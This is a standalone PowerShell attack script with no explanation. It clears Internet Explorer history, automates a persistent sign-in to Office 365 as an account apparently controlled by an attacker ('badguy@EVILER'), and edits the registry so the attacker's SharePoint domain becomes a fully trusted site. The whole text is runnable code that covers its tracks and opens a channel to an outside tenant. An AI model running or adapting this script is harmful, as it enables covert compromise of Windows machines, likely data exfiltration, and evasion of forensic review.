$Username = "badguy@EVILER.onmicrosoft.com";$Password = "Password1";$URL = "portal.office.com";Get-Process iexplore -EA SilentlyContinue | Stop-Process;rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 8;rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 2;rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 16;rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 32;$ie = New-Object -com InternetExplorer.Application;$ie.visible = $True;$ie.navigate($URL); while($ie.ReadyState -ne 4) {start-sleep -m 100};$ie.document.getElementById("cred_userid_inputtext").value= "$username";$ie.document.getElementById("cred_password_inputtext").value = "$password";$ie.document.getElementById("cred_keep_me_signed_in_checkbox").Checked = $True;while($ie.ReadyState -ne 4) {start-sleep -m 100};$ie.document.getElementById("cred_userid_inputtext").click();$ie.document.getElementById("cred_password_inputtext").click();$ie.document.getElementById("cred_sign_in_button").click();

$baddomain="eviler-my";
set-location "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\";
new-item sharepoint.com;
set-location "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\sharepoint.com";
new-item $baddomain;
set-location "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\sharepoint.com\eviler-my";
new-itemproperty . -Name https -Value 2 -Type DWORD;
new-itemproperty . -Name http -Value 2 -Type DWORD;
new-itemproperty . -Name * -Value 2 -Type DWORD;
